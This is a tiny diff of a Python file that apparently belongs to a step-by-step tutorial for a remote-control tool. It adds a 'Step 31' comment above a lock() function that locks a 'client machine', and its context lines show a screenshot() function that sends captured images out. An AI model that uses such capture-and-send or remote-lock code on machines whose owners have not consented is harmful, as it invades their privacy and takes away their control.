@@ -143,6 +143,7 @@ def screenshot(all_screens=True):
         sleep(1)
         send(pic.read())
 
+# Step 31: Define `lock()` Function to Lock Client Machine
 def lock():
     ctypes.windll.user32.LockWorkStation()
 
